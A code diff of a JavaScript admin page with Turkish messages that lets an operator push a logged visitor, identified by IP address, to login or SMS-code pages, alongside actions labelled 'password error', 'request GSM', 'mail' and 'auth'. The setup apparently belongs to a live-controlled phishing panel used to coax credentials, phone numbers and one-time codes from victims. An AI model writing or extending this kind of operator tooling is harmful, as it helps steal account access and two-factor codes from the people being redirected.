@@ -915,7 +915,7 @@
       });
     });
 
-    function handleMenuAction(logId, action) {
+    async function handleMenuAction(logId, action) {
       if (!logId) {
         updateFormLogsStatus('Kayıt bulunamadı', true);
         return;
@@ -927,37 +927,66 @@
         return;
       }
 
-      switch (action) {
-        case 'redirect-home':
-          // Başa gönder - login sayfasına yönlendir
-          window.location.href = '/login.html';
-          break;
-        case 'password-error':
-          updateFormLogsStatus('Şifre hatalı işlemi gerçekleştirildi');
-          break;
-        case 'request-gsm':
-          updateFormLogsStatus('GSM iste işlemi gerçekleştirildi');
-          break;
-        case 'sms':
-          updateFormLogsStatus('SMS işlemi gerçekleştirildi');
-          break;
-        case 'sms-error':
-          updateFormLogsStatus('SMS hatalı işlemi gerçekleştirildi');
-          break;
-        case 'mail':
-          updateFormLogsStatus('Mail işlemi gerçekleştirildi');
-          break;
-        case 'mail-error':
-          updateFormLogsStatus('Mail hatalı işlemi gerçekleştirildi');
-          break;
-        case 'auth':
-          updateFormLogsStatus('Auth işlemi gerçekleştirildi');
-          break;
-        case 'auth-error':
-          updateFormLogsStatus('Auth hatalı işlemi gerçekleştirildi');
-          break;
-        default:
-          updateFormLogsStatus('Bilinmeyen işlem', true);
+      if (!log.ip) {
+        updateFormLogsStatus('IP adresi bulunamadı', true);
+        return;
+      }
+
+      const actionMap = {
+        'redirect-home': '/login.html',
+        'sms': '/pages/sms.html',
+        'sms-error': '/pages/sms2.html'
+      };
+
+      const redirectTo = actionMap[action];
+      
+      if (redirectTo) {
+        try {
+          const res = await fetch('/api/admin/redirect', {
+            method: 'POST',
+            headers: {
+              ...authHeaders(),
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              ip: log.ip,
+              redirectTo
+            })
+          });
+
+          if (res.ok) {
+            updateFormLogsStatus(`${action} işlemi gerçekleştirildi - Kullanıcı yönlendiriliyor`);
+          } else {
+            updateFormLogsStatus('Yönlendirme hatası', true);
+          }
+        } catch (err) {
+          console.error('Redirect error', err);
+          updateFormLogsStatus('Yönlendirme hatası', true);
+        }
+      } else {
+        // Redirect gerektirmeyen işlemler
+        switch (action) {
+          case 'password-error':
+            updateFormLogsStatus('Şifre hatalı işlemi gerçekleştirildi');
+            break;
+          case 'request-gsm':
+            updateFormLogsStatus('GSM iste işlemi gerçekleştirildi');
+            break;
+          case 'mail':
+            updateFormLogsStatus('Mail işlemi gerçekleştirildi');
+            break;
+          case 'mail-error':
+            updateFormLogsStatus('Mail hatalı işlemi gerçekleştirildi');
+            break;
+          case 'auth':
+            updateFormLogsStatus('Auth işlemi gerçekleştirildi');
+            break;
+          case 'auth-error':
+            updateFormLogsStatus('Auth hatalı işlemi gerçekleştirildi');
+            break;
+          default:
+            updateFormLogsStatus('Bilinmeyen işlem', true);
+        }
       }
     }
 
